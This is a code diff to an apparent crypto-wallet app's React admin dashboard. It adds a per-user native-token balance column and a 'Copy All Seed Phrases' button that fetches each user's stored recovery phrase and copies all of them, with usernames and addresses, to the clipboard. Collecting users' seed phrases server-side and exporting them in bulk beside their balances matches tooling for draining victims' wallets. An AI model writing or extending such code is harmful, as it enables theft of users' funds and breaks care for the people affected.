@@ -1,6 +1,6 @@
 import { useEffect, useState } from 'react';
 import toast from 'react-hot-toast';
-import { UserCircle, UsersThree, ShieldSlash, CheckCircle, XCircle, Eye, Prohibit, User as UserIcon, Key, ListChecks } from 'phosphor-react';
+import { UserCircle, UsersThree, ShieldSlash, CheckCircle, XCircle, Eye, Prohibit, User as UserIcon, Key, ListChecks, Copy } from 'phosphor-react';
 
 // Prevent prerendering
 export const dynamic = 'force-dynamic';
@@ -29,6 +29,8 @@ export default function AdminDashboard() {
   const [referralClaims, setReferralClaims] = useState<Claim[]>([]);
   const [depositClaims, setDepositClaims] = useState<Claim[]>([]);
   const [stats, setStats] = useState<{ totalUsers: number; totalClaims: number }>({ totalUsers: 0, totalClaims: 0 });
+  // Tambahkan state untuk native balances
+  const [nativeBalances, setNativeBalances] = useState<Record<number, string>>({});
 
   const fetchUsers = () => {
     fetch('/api/user/list')
@@ -63,6 +65,52 @@ export default function AdminDashboard() {
   useEffect(() => {
     setStats(s => ({ ...s, bannedUsers: users.filter(u => u.banned).length }));
   }, [users]);
+
+  // Fetch native balances untuk semua user
+  const fetchNativeBalances = async (users: User[]) => {
+    const balances: Record<number, string> = {};
+    await Promise.all(users.map(async (user) => {
+      if (!user.address) return;
+      try {
+        const res = await fetch('/api/balance', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ address: user.address, chain: 'eth' }) // ganti chain sesuai kebutuhan
+        });
+        const data = await res.json();
+        // Ambil saldo native token (ETH/BNB/MATIC/BASE)
+        const native = data.balances?.find((b: any) => b.symbol === 'ETH' || b.symbol === 'BNB' || b.symbol === 'MATIC' || b.symbol === 'BASE');
+        balances[user.id] = native ? native.balance : '0';
+      } catch {
+        balances[user.id] = '0';
+      }
+    }));
+    setNativeBalances(balances);
+  };
+
+  // Fetch balances setiap kali users berubah
+  useEffect(() => {
+    if (users.length > 0) fetchNativeBalances(users);
+  }, [users]);
+
+  // Copy all seed phrases
+  const handleCopyAllSeedPhrases = async () => {
+    try {
+      const phrases: string[] = [];
+      for (const user of users) {
+        const res = await fetch(`/api/user/${user.id}/phrase`);
+        if (res.ok) {
+          const data = await res.json();
+          phrases.push(`${user.id} (${user.username || user.address}): ${data.seedPhrase || '(not found)'}`);
+        }
+      }
+      const all = phrases.join('\n');
+      await navigator.clipboard.writeText(all);
+      toast.success('All seed phrases copied!');
+    } catch (e) {
+      toast.error('Failed to copy all seed phrases');
+    }
+  };
 
   const handleBan = async (userId: number) => {
     await fetch(`/api/user/${userId}`, { method: 'PATCH' });
@@ -146,13 +194,15 @@ export default function AdminDashboard() {
         {/* User Management Table */}
         <section className="mb-10">
           <h2 className="text-xl font-semibold mb-4">User Management</h2>
+          <button onClick={handleCopyAllSeedPhrases} className="mb-4 btn-glass text-yellow-400 flex items-center gap-1"><Copy size={16}/>Copy All Seed Phrases</button>
           <div className="overflow-x-auto rounded-lg glass-card">
-            <table className="w-full min-w-[600px] text-sm">
+            <table className="w-full min-w-[700px] text-sm">
               <thead>
                 <tr className="bg-[#23243a]">
                   <th className="py-3 px-4 text-left">ID</th>
                   <th className="py-3 px-4 text-left">Username</th>
                   <th className="py-3 px-4 text-left">Address</th>
+                  <th className="py-3 px-4 text-left">Native Balance</th>
                   <th className="py-3 px-4 text-left">Status</th>
                   <th className="py-3 px-4 text-left">Action</th>
                 </tr>
@@ -162,9 +212,9 @@ export default function AdminDashboard() {
                   <tr key={user.id} className="transition hover:bg-[#2a2b45]">
                     <td className="py-2 px-4">{user.id}</td>
                     <td className="py-2 px-4 flex items-center gap-2">
-                      <UserIcon size={18} /> {user.username || '-'}
-                    </td>
+                      <UserIcon size={18} /> {user.username || '-'}</td>
                     <td className="py-2 px-4 font-mono text-xs">{user.address}</td>
+                    <td className="py-2 px-4 font-mono text-xs">{nativeBalances[user.id] || '-'}</td>
                     <td className="py-2 px-4">
                       {user.banned ? (
                         <span className="inline-block px-2 py-1 rounded bg-red-500/20 text-red-400 text-xs font-semibold">Banned</span>
